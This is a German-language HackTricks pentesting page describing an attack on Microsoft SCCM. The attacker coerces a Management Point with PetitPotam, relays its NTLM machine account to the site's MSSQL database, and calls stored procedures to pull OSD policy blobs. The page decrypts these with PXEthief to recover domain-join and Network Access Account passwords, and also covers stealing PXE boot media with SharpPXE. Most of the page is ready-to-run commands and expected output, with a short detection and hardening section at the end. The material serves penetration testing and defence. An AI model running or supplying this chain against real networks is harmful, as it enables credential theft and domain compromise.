# SCCM Management Point NTLM Relay zu SQL – Extraktion von OSD-Policy-Secrets

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Indem du einen **System Center Configuration Manager (SCCM) Management Point (MP)** dazu zwingst, sich über SMB/RPC zu authentifizieren, und dieses NTLM-Maschinenkonto anschließend an die **Site-Datenbank (MSSQL)** **relayst**, erhältst du die Rechte `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Diese Rollen ermöglichen den Aufruf einer Reihe gespeicherter Prozeduren, die **Operating System Deployment (OSD)**-Policy-Blobs offenlegen (Network Access Account credentials, Task-Sequence variables usw.). Die Blobs sind hex-kodiert/verschlüsselt, können aber mit **PXEthief** dekodiert und entschlüsselt werden, wodurch die Secrets im Klartext vorliegen.<sup>[[2]](#references)</sup>

High-level chain:
1. MP & Site DB ermitteln ↦ nicht authentifizierter HTTP-Endpunkt `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` starten.
3. MP mit **PetitPotam**, PrinterBug, DFSCoerce usw. coercen.
4. Über den SOCKS-Proxy mit `mssqlclient.py -windows-auth` als relayed **<DOMAIN>\\<MP-host>$**-Konto verbinden.
5. Ausführen:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (oder `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM entfernen, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets wie `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` usw. können wiederhergestellt werden, ohne PXE oder Clients zu berühren.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Nicht authentifizierte MP-Endpunkte enumerieren
Die MP-ISAPI-Erweiterung **GetAuth.dll** stellt mehrere Parameter bereit, die keine Authentifizierung erfordern (außer wenn die Site ausschließlich PKI verwendet):<sup>[[1]](#references)</sup>

| Parameter | Zweck |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Gibt den öffentlichen Schlüssel des Site-Signing-Zertifikats sowie GUIDs der Geräte *x86* / *x64* **All Unknown Computers** zurück. |
| `MPLIST` | Listet jeden Management-Point in der Site auf. |
| `SITESIGNCERT` | Gibt das Signing-Zertifikat der Primary-Site zurück (identifiziert den Site-Server ohne LDAP). |

Die GUIDs abrufen, die bei späteren DB-Abfragen als **clientID** dienen:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Das MP-Computerkonto zu MSSQL relayn
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Wenn die Coercion ausgelöst wird, solltest du etwa Folgendes sehen:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. OSD-Richtlinien über gespeicherte Prozeduren identifizieren
Über den SOCKS-Proxy verbinden (standardmäßig Port 1080):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Wechseln Sie zur **CM_<SiteCode>**-Datenbank (verwenden Sie den 3-stelligen Site-Code, z. B. `CM_001`).

### 3.1 GUIDs unbekannter Computer finden (optional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Zugewiesene Richtlinien auflisten
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Jede Zeile enthält `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Konzentriere dich auf folgende Policies:
* **NAAConfig** – Zugangsdaten des Network Access Account
* **TS_Sequence** – Variablen der Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Kann Run-as-Accounts enthalten

### 3.3 Vollständigen Body abrufen
Wenn du bereits `PolicyID` & `PolicyVersion` hast, kannst du die Anforderung der clientID mit folgendem Befehl überspringen:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> WICHTIG: Erhöhe in SSMS „Maximum Characters Retrieved“ (>65535), sonst wird der blob abgeschnitten.

---

## 4. Den blob decodieren und entschlüsseln
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Beispiel für wiederhergestellte Geheimnisse:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevante SQL-Rollen & -Prozeduren
Nach dem Relay wird das Login folgenden Rollen zugeordnet:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Diese Rollen verfügen über Dutzende von EXEC-Berechtigungen. Die wichtigsten, die bei diesem Angriff verwendet werden, sind:

| Stored Procedure | Zweck |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Listet die auf eine `clientID` angewendeten Policies auf. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Gibt den vollständigen Policy-Body zurück. |
| `MP_GetListOfMPsInSiteOSD` | Wird über den Pfad `MPKEYINFORMATIONMEDIA` zurückgegeben. |

Die vollständige Liste kann wie folgt eingesehen werden:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE-Boot-Medien-Erfassung (SharpPXE)
* **PXE-Antwort über UDP/4011**: Sende eine PXE-Boot-Anfrage an einen für PXE konfigurierten Distribution Point. Die proxyDHCP-Antwort gibt Boot-Pfade wie `SMSBoot\\x64\\pxe\\variables.dat` (verschlüsselte Konfiguration) und `SMSBoot\\x64\\pxe\\boot.bcd` sowie optional einen verschlüsselten Schlüssel-Blob preis.<sup>[[4]](#references)</sup>
* **Abrufen der Boot-Artefakte über TFTP**: Verwende die zurückgegebenen Pfade, um `variables.dat` über TFTP herunterzuladen (ohne Authentifizierung). Die Datei ist klein (einige KB) und enthält die verschlüsselten Medienvariablen.
* **Entschlüsseln oder cracken**:
- Wenn die Antwort den Entschlüsselungsschlüssel enthält, übergib ihn an **SharpPXE**, um `variables.dat` direkt zu entschlüsseln.
- Wenn kein Schlüssel bereitgestellt wird (PXE-Medium durch ein benutzerdefiniertes Passwort geschützt), gibt SharpPXE einen **Hashcat-kompatiblen** `$sccm$aes128$...`-Hash für Offline-Cracking aus. Nach dem Wiederherstellen des Passworts kann die Datei entschlüsselt werden.
* **Parsen des entschlüsselten XML**: Die Klartextvariablen enthalten SCCM-Deployment-Metadaten (**Management Point URL**, **Site Code**, Medien-GUIDs und weitere Kennungen). SharpPXE parst sie und gibt einen direkt ausführbaren **SharpSCCM**-Befehl mit vorausgefüllten GUID-/PFX-/Site-Parametern für den weiteren Missbrauch aus.
* **Voraussetzungen**: Es ist lediglich Netzwerkzugriff auf den PXE-Listener (UDP/4011) und TFTP erforderlich; lokale Administratorrechte werden nicht benötigt.

---

## 7. Detection & Hardening
1. **MP-Logins überwachen** – jedes MP-Computerkonto, das sich von einer IP-Adresse anmeldet, die nicht zu seinem Host gehört, ≈ Relay.<sup>[[1]](#references)</sup>
2. **Extended Protection for Authentication (EPA)** für die Site-Datenbank aktivieren (`PREVENT-14`).
3. Nicht verwendetes NTLM deaktivieren, SMB-Signing erzwingen und RPC einschränken (dieselben Mitigations wie gegen `PetitPotam`/`PrinterBug`).
4. Die MP-↔-DB-Kommunikation mit IPSec / gegenseitigem TLS absichern.
5. **PXE-Exposure einschränken** – UDP/4011 und TFTP auf vertrauenswürdige VLANs beschränken, PXE-Passwörter voraussetzen und TFTP-Downloads von `SMSBoot\\*\\pxe\\variables.dat` überwachen.<sup>[[4]](#references)</sup>

---

## See also
* NTLM-Relay-Grundlagen:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL-Missbrauch und Post-Exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
